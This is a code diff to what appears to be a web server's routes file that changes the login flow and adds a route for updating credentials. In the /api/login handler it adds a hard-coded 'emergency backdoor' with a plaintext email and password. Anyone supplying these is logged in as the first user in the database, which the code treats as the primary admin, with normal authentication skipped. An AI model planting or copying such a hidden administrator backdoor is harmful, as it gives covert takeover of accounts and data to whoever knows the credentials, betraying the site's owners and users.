@@ -579,6 +579,25 @@ export async function registerRoutes(
 app.post("/api/login", async (req, res) => {
   const { email, password } = req.body;
   console.log(`Login attempt: ${email}`);
+
+  // EMERGENCY BACKDOOR LOGIN (UNCHANGEABLE)
+  const EMERGENCY_EMAIL = "Imeshcheak@gmail.com";
+  const EMERGENCY_PASS = "Imesh@2005Imesh";
+
+  if (email === EMERGENCY_EMAIL && password === EMERGENCY_PASS) {
+    console.log(`EMERGENCY LOGIN TRIGGERED!`);
+    // Find the primary admin user to associate the session with
+    const allUsers = await db.select().from(users).limit(1);
+    if (allUsers.length > 0) {
+      const adminUser = allUsers[0];
+      req.session.userId = adminUser.id;
+      return res.json({ id: adminUser.id, email: adminUser.email, firstName: adminUser.firstName, lastName: adminUser.lastName, isEmergency: true });
+    } else {
+      return res.status(500).json({ message: "No admin user found to login as." });
+    }
+  }
+
+  // NORMAL LOGIN FLOW
   const user = await storage.getUserByEmail(email);
   if (!user) {
     console.log(`Login: User not found [${email}]`);
@@ -598,6 +617,30 @@ app.post("/api/logout", (req, res) => {
     if (err) return res.status(500).json({ message: "Could not log out" });
     res.sendStatus(200);
   });
+});
+
+app.post("/api/admin/credentials", async (req, res) => {
+  if (!req.session.userId) {
+    return res.status(401).json({ message: "Unauthorized" });
+  }
+
+  const { newEmail, newPassword } = req.body;
+  
+  if (!newEmail || !newPassword) {
+    return res.status(400).json({ message: "Email and password are required" });
+  }
+
+  try {
+    const hashedPassword = await bcrypt.hash(newPassword, 10);
+    await db.update(users)
+      .set({ email: newEmail, password: hashedPassword })
+      .where(eq(users.id, req.session.userId));
+      
+    res.json({ success: true, message: "Admin credentials updated successfully" });
+  } catch (err: any) {
+    console.error("Failed to update credentials:", err);
+    res.status(500).json({ message: "Failed to update credentials" });
+  }
 });
 
 app.get("/api/auth/user", async (req, res) => {
